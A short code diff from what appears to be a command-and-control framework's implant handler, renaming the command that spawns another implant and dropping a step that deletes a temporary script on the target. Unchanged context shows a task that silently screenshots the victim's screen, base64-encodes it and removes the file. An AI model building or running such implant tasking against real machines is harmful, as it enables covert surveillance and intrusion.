@@ -365,12 +365,8 @@ def runcommand(command, randomuri):
       update_sleep(command, randomuri)
       new_task(sleep, randomuri)
 
-    elif 'startanotherimplant-keepfile' in command.lower():
+    elif command.lower() == 'sai':
       new_task('startanotherimplant', randomuri)
-
-    elif 'startanotherimplant' in command.lower():
-      new_task(command.lower(), randomuri)
-      new_task("rm /tmp/fdjskla.sh", randomuri)
 
     elif 'get-screenshot' in command.lower():
       taskcmd = "screencapture -x /tmp/s;base64 /tmp/s;rm /tmp/s"
